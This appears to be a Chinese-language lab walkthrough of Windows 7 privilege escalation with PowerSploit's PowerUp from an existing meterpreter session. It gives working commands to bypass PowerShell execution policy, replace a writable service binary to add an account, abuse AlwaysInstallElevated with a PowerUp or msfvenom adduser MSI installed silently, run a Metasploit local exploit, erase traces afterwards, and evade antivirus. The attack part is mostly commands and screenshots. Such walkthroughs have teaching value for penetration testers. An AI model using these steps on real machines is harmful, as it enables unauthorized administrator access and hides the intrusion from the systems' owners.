## PowerUP攻击模块实战演练

# Powerup案列1：

PowerUp攻击渗透实战

## 1）准备环境

kali linux 攻击机 已获得靶机meterpreter(非管理)权限

win7 靶机  拥有powershell环境

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5t6czu34yj30oz023q2s.jpg)

## 2）Invoke-Allchecks检查

首先上传powerup脚本至目标服务器

```
upload //var/www/html/PowerSploit/Privesc/PowerUp.ps1 c:\   //上传到目标服务器的C盘。
```

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5t6ebg5d4j30p700vglf.jpg)

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5t73q2csvj30ol0f375z.jpg)

使用IEX在内存中加载此脚本，执行Invoke-AllChecks检查漏洞

```
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('C:\PowerUp.ps1'); Invoke-AllChecks"  //执行Invoke-AllChecks检查漏洞
```

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tfrbz31jj30wx0e7anr.jpg)

也可以在cmd环境导入模块绕过策略执行:

```
powershell.exe -exec bypass -Command "& {Import-Module c:\PowerUp.ps1; Invoke-AllChecks}"
```

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tfs43trmj30x90cwqd6.jpg)

可以看出，Powerup 列出了可能存在问题的所有服务，并在 AbuseFunction 中直接给出了利用方式。

第一部分通过 Get-ServiceUnquoted 模块（利用 windows 的一个逻辑漏洞，即当文件包含空格时，windows API 会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升）检测出了有 "Vulnerable Service"、"OmniServ"、"OmniServer"、"OmniServers" 四个服务存在此逻辑漏洞，但是都没有写入权限，所以并不能被我们利用来提权。第二部分通过 Test-ServiceDaclPermission 模块（检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则存在此漏洞）检测出当前用户可以在 "OmniServers" 服务的目录写入相关联的可执行文件，并且通过这些文件来进行提权。

知识点：

漏洞利用原理：Windows 系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。比如，JAVA 升级程序，每次重启系统时，JAVA 升级程序会检测 Oracle 网站，是否有新版 JAVA 程序。而类似 JAVA 程序之类的系统服务程序加载时往往都是运行在系统权限上的。所以如果一个低权限的用户对于此类系统服务调用的可执行文件具有可写的权限，那么就可以将其替换成我们的恶意可执行文件，从而随着系统启动服务而获得系统权限。

## 3）检测可写入权限

这里我们可以使用 icacls（Windows 内建的一个工具，用来检查对有漏洞目录是否有写入的权限）来验证下 PowerUp 脚本检测是否正确，我们先对于检测出来的漏洞目录进行权限的检测

```
icacls "C:\Program Files\Windows Media Player\wmpnetwk.exe"    //检测此目录是否有可写入权限。
```

 ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tftzde8sj30of07dq6h.jpg)

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tfv3z50tj30x508045b.jpg)

"Everyone" 用户对这个文件有完全控制权，就是说所有用户都具有全部权限修改这个文件夹。

参数说明："M" 表示修改，"F" 代表完全控制，"CI" 代表从属容器将继承访问控制项，"OI" 代表从属文件将继承访问控制项。这意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。

## 4）提升权限

我们使用 AbuseFunction 那里已经给出的具体操作方式，执行如下命令操作，如下图所示。3

``````
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'WMPNetworkSvc' -UserName qing -Password qing123!
``````

 之后当管理员运行该服务的时候，则会添加我们的账号。

知识点：Install-ServiceBinary模块的功能是通过Write-ServiceBinary写一个用于添加用户的C#服务。



手动输入：`shutdown -r -f -t 0` 进行重启。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tg7py1uoj30cu05f76f.jpg)

重启以后，系统会自动创建了一个新的用户 qing，密码是 qing123!

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5tg84fp3vj30no05wq4g.jpg)

##  5）删除痕迹

提权成功后需要清除入侵的痕迹，可以使用以下命令：

```
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName 'WMPNetworkSvc' 
```

执行命令后可以把所有的状态恢复到最初的状态，

恢复

"C:\Program Files\Windows Media Player\wmpnetwk.exe.bak"为"C:\Program Files\Windows Media Player\wmpnetwk.exe"

移除备份二进制文件‘

"C:\Program Files\Windows Media Player\wmpnetwk.exe.bak"

# Powerup案列2：

准备环境：

kali linux 攻击机 已获得靶机meterpreter(非管理)权限

win7 靶机  拥有powershell环境

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190317110327370-1120633834.png)

 

运用到的模块:Get-RegistryAlwaysInstallElevated，Write-UserAddMSI

## 0x01信息收集

上传好PowerUp.ps1后(本例子中上传至靶机的C盘)

使用 Powerup 的 Get-RegistryAlwaysInstallElevated 模块来检查注册表项是否被设置，此策略在本地策略编辑器(gpedit.msc):

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319113426535-32402047.png)

 

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319113400496-1996623077.png)

 

 

##  

如果 AlwaysInstallElevated 注册表项被设置，意味着的 MSI 文件是以 system 权限运行的。命令如下，True 表示已经设置

```
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Get-RegistryAlwaysInstallElevated
```

也可以使用注册表查看

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

 

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319105832305-769025220.png)

 

 

 ![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319105758708-952632147.png)

## 0x02 权限提升

接着我们需要生成恶意的MSI安装文件，让其来添加用户，第一种方法可以使用PowerUp脚本自带的 Write-UserAddMSI 模块，运行后生成文件 UserAdd.msi

```
C:\>powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('c:/PowerUp.p
s1');Write-UserAddMSI
```

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319111132223-1158618501.png)

这时以普通用户权限运行这个 UserAdd.msi，就会成功添加账户：

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319111239840-511959817.png)

 

我们在查看下管理员组的成员，可以看到已经成功在普通权限的 CMD 下添加了一个管理员账户。

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319111331670-1624883851.png)

 

 

## 第二种方法我们也可以配和msf生成木马，同样的效果

```
msfvenom -f msi -p windows/adduser USER=qing PASS=123P@ss! -o /root/msi.msi
```

## 注意密码设置的!最好放最后

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319111910590-383538727.png)

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319112028458-1118083068.png)

 

meterpreter上传木马msi，然后运行即可

```
upload /root/msi.msi c:\\msi.msi
```

（这里C后面一定是两个\，容易忽视的细节）

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319112145295-558725144.png)

msiexec工具相关的参数： /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序 执行之后，成功添加上了该账号密码。如图5所示。当然这里也可以直接生成木马程序。 注：由于是msf生成的msi文件，所以默认会被杀毒软件拦截，做好免杀。

```
msiexec /quiet /qn /i C:\msi.msi
```

##  

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319112551723-1138151630.png)

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319112705211-347105967.png)



msf下也有自动化的模块供我们提权使用

```
exploit/windows/local/always_install_elevated
```

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319113149986-827589513.png)

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319113210683-1969399296.png)

第二个session即为我们提权的新连接

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190319113239195-1457371973.png)

 